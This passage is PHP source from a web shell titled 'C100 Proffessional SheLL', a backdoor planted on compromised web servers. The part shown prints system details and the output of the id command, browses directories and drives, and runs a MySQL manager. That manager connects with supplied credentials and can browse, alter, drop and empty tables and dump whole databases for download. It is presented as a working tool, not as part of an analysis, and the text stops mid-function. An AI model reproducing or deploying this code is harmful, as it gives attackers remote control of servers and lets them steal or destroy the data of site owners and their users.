5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C100 Proffessional SheLL By Psych0v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php 
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);} 
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
$d = str_replace("\\\\","\\",$d); 
$dispd = htmlspecialchars($d); 
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1)); 
$i = 0; 
foreach($pd as $b) 
{ 
 $t = ""; 
 $j = 0; 
 foreach ($e as $r) 
 { 
$t.= $r.DIRECTORY_SEPARATOR; 
if ($j == $i) {break;} 
$j++; 
 } 
 echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>"; 
 $i++; 
} 
echo "&nbsp;&nbsp;&nbsp;"; 
if (is_writable($d)) 
{ 
 $wd = TRUE; 
 $wdt = "<font color=green>[ ok ]</font>"; 
 echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>"; 
} 
else 
{ 
 $wd = FALSE; 
 $wdt = "<font color=red>[ Read-Only ]</font>"; 
 echo "<b>".view_perms_color($d)."</b>"; 
} 
if (is_callable("disk_free_space")) 
{ 
 $free = disk_free_space($d); 
 $total = disk_total_space($d); 
 if ($free === FALSE) {$free = 0;} 
 if ($total === FALSE) {$total = 0;} 
 if ($free < 0) {$free = 0;} 
 if ($total < 0) {$total = 0;} 
 $used = $total-$free; 
 $free_percent = round(100/($total/$free),2); 
 echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>"; 
} 
echo "<br>"; 
$letters = ""; 
if ($win) 
{ 
 $v = explode("\\",$d); 
 $v = $v[0]; 
 foreach (range("a","z") as $letter) 
 { 
$bool = $isdiskette = in_array($letter,$safemode_diskettes); 
if (!$bool) {$bool = is_dir($letter.":\\");} 
if ($bool) 
{ 
$letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">[ "; 
if ($letter.":" != $v) {$letters .= $letter;} 
else {$letters .= "<font color=green>".$letter."</font>";} 
$letters .= " ]</a> "; 
} 
 } 
 if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";} 
} 
if (count($quicklaunch) > 0) 
{ 
 foreach($quicklaunch as $item) 
 { 
$item[1] = str_replace("%d",urlencode($d),$item[1]); 
$item[1] = str_replace("%sort",$sort,$item[1]); 
$v = realpath($d.".."); 
if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);} 
$item[1] = str_replace("%upd",urlencode($v),$item[1]); 
echo "<a href=\"".$item[1]."\">".$item[0]."</a>&nbsp;&nbsp;&nbsp;&nbsp;"; 
 } 
} 
echo "</p></td></tr></table><br>"; 
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";} 
echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">"; 
if ($act == "") {$act = $dspact = "ls";} 
if ($act == "sql") 
{ 
 $sql_surl = $surl."act=sql"; 
 if ($sql_login){$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);} 
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);} 
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);} 
 if ($sql_port){$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);} 
 if ($sql_db){$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);} 
 $sql_surl .= "&"; 
 ?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php 
 if ($sql_server) 
 { 
$sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd); 
$err = mysql_smarterror(); 
@mysql_select_db($sql_db,$sql_sock); 
if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();} 
 } 
 else {$sql_sock = FALSE;} 
 echo "<b>SQL Manager:</b><br>"; 
 if (!$sql_sock) 
 { 
if (!$sql_server) {echo "NO CONNECTION";} 
else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";} 
 } 
 else 
 { 
$sqlquicklaunch = array(); 
$sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"); 
$sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)); 
$sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus"); 
$sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars"); 
$sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes"); 
$sqlquicklaunch[] = array("Logout",$surl."act=sql"); 
echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>"; 
if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><b>".$item[0]."</b></a> ] ";}} 
echo "</center>"; 
 } 
 echo "</td></tr><tr>"; 
 if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php } 
 else 
 { 
//Start left panel 
if (!empty($sql_db)) 
{ 
?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php 
$result = mysql_list_tables($sql_db); 
if (!$result) {echo mysql_smarterror();} 
else 
{ 
 echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>"; 
 $c = 0; 
 while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;} 
 if (!$c) {echo "No tables found in database.";} 
} 
} 
else 
{ 
?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php 
$result = mysql_list_dbs($sql_sock); 
if (!$result) {echo mysql_smarterror();} 
else 
{ 
 ?><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><select name="sql_db"><?php 
 $c = 0; 
 $dbs = ""; 
 while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;} 
 echo "<option value=\"\">Databases (".$c.")</option>"; 
 echo $dbs; 
} 
?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php 
} 
//End left panel 
echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">"; 
//Start center panel 
$diplay = TRUE; 
if ($sql_db) 
{ 
if (!is_numeric($c)) {$c = 0;} 
if ($c == 0) {$c = "no";} 
echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>"; 
if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}} 
echo "</b></center>"; 
$acts = array("","dump"); 
if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";} 
elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";} 
elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";} 
elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";} 
elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";} 
elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";} 
elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";} 
elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";} 
elseif ($sql_tbl_act == "insert") 
{ 
 if ($sql_tbl_insert_radio == 1) 
 { 
$keys = ""; 
$akeys = array_keys($sql_tbl_insert); 
foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";} 
if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);} 
$values = ""; 
$i = 0; 
foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;} 
if (!empty($values)) {$values = substr($values,0,strlen($values)-2);} 
$sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );"; 
$sql_act = "query"; 
$sql_tbl_act = "browse"; 
 } 
 elseif ($sql_tbl_insert_radio == 2) 
 { 
$set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs); 
$sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;"; 
$result = mysql_query($sql_query) or print(mysql_smarterror()); 
$result = mysql_fetch_array($result, MYSQL_ASSOC); 
$sql_act = "query"; 
$sql_tbl_act = "browse"; 
 } 
} 
if ($sql_act == "query") 
{ 
 echo "<hr size=\"1\" noshade>"; 
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";} 
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;} 
 if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td></tr></table>";} 
} 
if (in_array($sql_act,$acts)) 
{ 
 ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php 
 if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";} 
 if ($sql_act == "newtbl") 
 { 
echo "<b>"; 
if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>"; 
 } 
 else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();} 
} 
elseif ($sql_act == "dump") 
{ 
 if (empty($submit)) 
 { 
$diplay = FALSE; 
echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>"; 
echo "<b>DB:</b>&nbsp;<input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>"; 
$v = join (";",$dmptbls); 
echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>"; 
if ($dump_file) {$tmp = $dump_file;} 
else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");} 
echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>"; 
echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>"; 
echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>"; 
echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty"; 
echo "</form>"; 
 } 
 else 
 { 
$diplay = TRUE; 
$set = array(); 
$set["sock"] = $sql_sock; 
$set["db"] = $sql_db; 
$dump_out = "download"; 
$set["print"] = 0; 
$set["nl2br"] = 0; 
$set[""] = 0; 
$set["file"] = $dump_file; 
$set["add_drop"] = TRUE; 
$set["onlytabs"] = array(); 
if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);} 
$ret = mysql_dump($set); 
if ($sql_dump_download) 
{ 
@ob_clean(); 
header("Content-type: application/octet-stream"); 
header("Content-length: ".strlen($ret)); 
header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";"); 
echo $ret; 
exit; 
} 
elseif ($sql_dump_savetofile) 
{ 
$fp = fopen($sql_dump_file,"w"); 
if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";} 
else 
{ 
 fwrite($fp,$ret); 
 fclose($fp); 
 echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>."; 
} 
} 
else {echo "<b>Dump: nothing to do!</b>";} 
 } 
} 
if ($diplay) 
{ 
 if (!empty($sql_tbl)) 
 { 
if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";} 
$count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;"); 
$count_row = mysql_fetch_array($count); 
mysql_free_result($count); 
$tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;"); 
$tbl_struct_fields = array(); 
while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;} 
if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;} 
if (empty($sql_tbl_page)) {$sql_tbl_page = 0;} 
if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;} 
if (empty($sql_tbl_le)) {$sql_tbl_le = 30;} 
$perpage = $sql_tbl_le - $sql_tbl_ls; 
if (!is_numeric($perpage)) {$perpage = 10;} 
$numpages = $count_row[0]/$perpage; 
$e = explode(" ",$sql_order); 
if (count($e) == 2) 
{ 
if ($e[0] == "d") {$asc_desc = "DESC";} 
else {$asc_desc = "ASC";} 
$v = "ORDER BY `".$e[1]."` ".$asc_desc." "; 
} 
else {$v = "";} 
$query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage.""; 
$result = mysql_query($query) or print(mysql_smarterror()); 
echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>"; 
echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;"; 
echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;"; 
echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;"; 
echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;"; 
if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";} 
if ($sql_tbl_act == "insert") 
{ 
if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();} 
if (!empty($sql_tbl_insert_radio)) 
{ 

} 
else 
{ 
 echo "<br><br><b>Inserting row into table:</b><br>"; 
 if (!empty($sql_tbl_insert_q)) 
 { 
$sql_query = "SELECT * FROM `".$sql_tbl."`"; 
$sql_query .= " WHERE".$sql_tbl_insert_q; 
$sql_query .= " LIMIT 1;"; 
$result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror()); 
$values = mysql_fetch_assoc($result); 
mysql_free_result($result); 
 } 
 else {$values = array();} 
 echo "<form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>"; 
 foreach ($tbl_struct_fields as $field) 
 { 
$name = $field["Field"]; 
if (empty($sql_tbl_insert_q)) {$v = "";} 
echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>"; 
$i++; 
 } 
 echo "</table><br>"; 
 echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>"; 
 if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";} 
 echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>"; 
} 
} 
if ($sql_tbl_act == "browse") 
{ 
$sql_tbl_ls = abs($sql_tbl_ls); 
$sql_tbl_le = abs($sql_tbl_le); 
echo "<hr size=\"1\" noshade>"; 
echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;"; 
$b = 0; 
for($i=0;$i<$numpages;$i++) 
{ 
 if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";} 
 echo $i; 
 if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";} 
 if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";} 
 else {echo "&nbsp;";} 
} 
if ($i == 0) {echo "empty";} 
echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>"; 
echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>"; 
echo "<tr>"; 
echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>"; 
for ($i=0;$i<mysql_num_fields($result);$i++) 
{ 
 $v = mysql_field_name($result,$i); 
 if ($e[0] == "a") {$s = "d"; $m = "asc";} 
 else {$s = "a"; $m = "desc";} 
 echo "<td>"; 
 if (empty($e[0])) {$e[0] = "a";} 
 if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";} 
 else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";} 
 echo "</td>"; 
} 
echo "<td><font color=\"green\"><b>Action</b></font></td>"; 
echo "</tr>"; 
while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) 
{ 
 echo "<tr>"; 
 $w = ""; 
 $i = 0; 
 foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;} 
 if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);} 
 echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>"; 
 $i = 0; 
 foreach ($row as $k=>$v) 
 { 
$v = htmlspecialchars($v); 
if ($v == "") {$v = "<font color=\"green\">NULL</font>";} 
echo "<td>".$v."</td>"; 
$i++; 
 } 
 echo "<td>"; 
